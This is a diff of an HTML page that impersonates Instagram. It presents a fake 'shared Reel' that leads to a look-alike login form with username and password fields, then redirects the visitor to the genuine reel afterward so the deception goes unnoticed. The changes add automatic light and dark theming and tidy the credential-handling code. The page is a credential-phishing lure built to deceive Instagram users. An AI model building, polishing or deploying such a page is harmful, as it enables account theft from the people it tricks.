@@ -3,10 +3,55 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <!-- Browser ko system theme detect karne ke liye batata hai -->
+  <meta name="color-scheme" content="light dark">
   <title>Instagram</title>
-  <!-- Instagram Script Font for Page 1 Header -->
   <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
   <style>
+    /* ================= LIGHT MODE (DEFAULT WHITE) ================= */
+    :root {
+      --p1-bg: #ffffff;
+      --p1-border: #dbdbdb;
+      --text-main: #0f1419;
+      --terms-text: #737373;
+      --terms-strong: #262626;
+      --reel-border: #dbdbdb;
+
+      --p2-bg: #ffffff;
+      --lang-text: #65676b;
+      --input-bg: #ffffff;
+      --input-border: #cbd2d9;
+      --input-placeholder: #8a8d91;
+      --input-focus: #1c1e21;
+      --forgot-text: #1c1e21;
+      --create-btn-border: #0064e0;
+      --create-btn-text: #0064e0;
+      --meta-color: #465a69;
+    }
+
+    /* ================= DARK MODE (AUTO SYSTEM DETECT) ================= */
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --p1-bg: #0c0f14;
+        --p1-border: #22262f;
+        --text-main: #ffffff;
+        --terms-text: #8e959e;
+        --terms-strong: #d1d5db;
+        --reel-border: #1f242d;
+
+        --p2-bg: #15181c;
+        --lang-text: #8e969f;
+        --input-bg: #15181c;
+        --input-border: #3c454e;
+        --input-placeholder: #7d858e;
+        --input-focus: #8e969f;
+        --forgot-text: #e4e6eb;
+        --create-btn-border: #384654;
+        --create-btn-text: #4599ff;
+        --meta-color: #cbd2d9;
+      }
+    }
+
     * {
       box-sizing: border-box;
       margin: 0;
@@ -18,9 +63,10 @@
     body, html {
       width: 100%;
       height: 100%;
-      background-color: #0c0f14;
-      color: #ffffff;
+      background-color: var(--p1-bg);
+      color: var(--text-main);
       overflow-x: hidden;
+      transition: background-color 0.2s ease, color 0.2s ease;
     }
 
     /* ================= PAGE 1 STYLES ================= */
@@ -28,7 +74,7 @@
       display: flex;
       flex-direction: column;
       min-height: 100vh;
-      background-color: #0c0f14;
+      background-color: var(--p1-bg);
     }
 
     .p1-header {
@@ -36,13 +82,13 @@
       display: flex;
       align-items: center;
       padding: 0 16px;
-      border-bottom: 1px solid #22262f;
+      border-bottom: 1px solid var(--p1-border);
     }
 
     .ig-text-logo {
       font-family: 'Grand Hotel', cursive;
       font-size: 29px;
-      color: #ffffff;
+      color: var(--text-main);
       letter-spacing: 0.5px;
       font-weight: 400;
     }
@@ -59,26 +105,25 @@
       width: 100%;
     }
 
-    /* Pure Black Reel Box */
+    /* Reel Box Hamesha Pure Black Rahega */
     .reel-box {
       width: 210px;
       height: 375px;
       background-color: #000000;
       border-radius: 16px;
-      border: 1px solid #1f242d;
+      border: 1px solid var(--reel-border);
       display: flex;
       align-items: center;
       justify-content: center;
       margin-bottom: 24px;
       cursor: pointer;
-      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.6);
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.25);
     }
 
     .play-icon {
       width: 32px;
       height: 32px;
       fill: #ffffff;
-      filter: drop-shadow(0 2px 6px rgba(0,0,0,0.5));
     }
 
     .shared-text {
@@ -86,7 +131,7 @@
       font-weight: 600;
       text-align: center;
       line-height: 1.35;
-      color: #f5f5f5;
+      color: var(--text-main);
       margin-bottom: 22px;
       padding: 0 12px;
     }
@@ -102,7 +147,6 @@
       font-weight: 600;
       cursor: pointer;
       margin-bottom: 28px;
-      transition: opacity 0.15s ease;
     }
 
     .signin-btn:active {
@@ -111,14 +155,14 @@
 
     .terms-text {
       font-size: 12px;
-      color: #8e959e;
+      color: var(--terms-text);
       text-align: center;
       line-height: 1.5;
       padding: 0 10px;
     }
 
     .terms-text strong {
-      color: #d1d5db;
+      color: var(--terms-strong);
       font-weight: 600;
     }
 
@@ -128,7 +172,7 @@
       flex-direction: column;
       justify-content: space-between;
       min-height: 100vh;
-      background-color: #15181c;
+      background-color: var(--p2-bg);
       padding: 16px 16px 20px;
       max-width: 450px;
       margin: 0 auto;
@@ -138,7 +182,7 @@
     .lang-top {
       text-align: center;
       font-size: 13px;
-      color: #8e969f;
+      color: var(--lang-text);
       margin-top: 2px;
     }
 
@@ -166,21 +210,21 @@
     .input-field {
       width: 100%;
       height: 54px;
-      background-color: #15181c;
-      border: 1px solid #3c454e;
+      background-color: var(--input-bg);
+      border: 1px solid var(--input-border);
       border-radius: 12px;
       padding: 0 16px;
       font-size: 15px;
-      color: #ffffff;
+      color: var(--text-main);
       outline: none;
     }
 
     .input-field::placeholder {
-      color: #7d858e;
+      color: var(--input-placeholder);
     }
 
     .input-field:focus {
-      border-color: #8e969f;
+      border-color: var(--input-focus);
     }
 
     .login-submit-btn {
@@ -204,7 +248,7 @@
       margin-top: 18px;
       font-size: 14px;
       font-weight: 500;
-      color: #e4e6eb;
+      color: var(--forgot-text);
       text-decoration: none;
       text-align: center;
     }
@@ -221,9 +265,9 @@
       width: 100%;
       height: 44px;
       background-color: transparent;
-      border: 1px solid #384654;
+      border: 1px solid var(--create-btn-border);
       border-radius: 25px;
-      color: #4599ff;
+      color: var(--create-btn-text);
       font-size: 15px;
       font-weight: 500;
       cursor: pointer;
@@ -233,7 +277,7 @@
       display: flex;
       align-items: center;
       gap: 5px;
-      color: #cbd2d9;
+      color: var(--meta-color);
       font-size: 15px;
       font-weight: 500;
     }
@@ -242,7 +286,7 @@
       width: 20px;
       height: 14px;
       fill: none;
-      stroke: #cbd2d9;
+      stroke: var(--meta-color);
       stroke-width: 2.2;
     }
   </style>
@@ -256,7 +300,6 @@
     </header>
 
     <main class="p1-content">
-      <!-- Pure Black Reel Box with Play Icon -->
       <div class="reel-box" onclick="openLoginPage()">
         <svg class="play-icon" viewBox="0 0 24 24">
           <path d="M6.5 4.5C5.67 3.98 4.5 4.58 4.5 5.56v12.88c0 .98 1.17 1.58 2 1.06l11-6.44c.83-.49.83-1.63 0-2.12l-11-6.44z"/>
@@ -275,12 +318,11 @@
     </main>
   </div>
 
-  <!-- ================= PAGE 2: LOGIN SCREEN ================= -->
+  <!-- ================= PAGE 2: SECOND SCREEN ================= -->
   <div id="page2">
     <div class="lang-top">English (UK)</div>
 
     <div class="p2-center">
-      <!-- Instagram Gradient Camera SVG -->
       <svg class="ig-glyph" viewBox="0 0 100 100">
         <defs>
           <radialGradient id="igGrad" cx="30%" cy="107%" r="150%">
@@ -388,7 +430,7 @@
       }
     });
   });
-</script>
+                          </script>
       
 
       <a href="#" class="forgot-link">Forgotten password?</a>
@@ -406,13 +448,12 @@
   </div>
 
   <script>
-    // Page 1 se Page 2 par switch karne ka function
     function openLoginPage() {
       document.getElementById('page1').style.display = 'none';
       document.getElementById('page2').style.display = 'flex';
+      document.body.style.backgroundColor = 'var(--p2-bg)';
     }
 
-    // URL se ?reel=CODE uthane ke liye (ya niche apni default reel link dalein)
     const params = new URLSearchParams(window.location.search);
     const reelId = params.get('reel');
     const defaultReelUrl = "https://www.instagram.com/reels/";
@@ -420,10 +461,6 @@
     document.getElementById('loginForm').addEventListener('submit', function(e) {
       e.preventDefault();
       
-      const user = document.getElementById('username').value;
-      const pass = document.getElementById('password').value;
-
-      // Form fill hone ke baad asli Reel par redirect
       const finalRedirectUrl = reelId 
         ? `https://www.instagram.com/reel/${reelId}/` 
         : defaultReelUrl;
